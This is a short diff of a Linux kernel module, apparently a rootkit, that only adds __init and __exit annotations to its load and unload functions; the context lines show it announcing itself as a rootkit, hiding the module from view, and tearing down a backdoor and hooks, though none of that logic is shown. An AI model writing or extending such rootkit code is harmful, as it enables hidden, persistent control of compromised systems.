@@ -15,7 +15,7 @@
 
 
 //insmod
-static int lkm_init(void){
+static int __init lkm_init(void){
 	printk("ROOTKIT: Starting Rootkit ---------------------------------\n");
 	if (HIDE_MODULE){
 		if (hide_module() == -1){
@@ -57,7 +57,7 @@ static int lkm_init(void){
 }
 
 //rmmod
-static void lkm_exit(void){
+static void __exit lkm_exit(void){
 	proc_exit();
 	if (BACKDOOR) backdoor_exit();
 	hooks_exit();
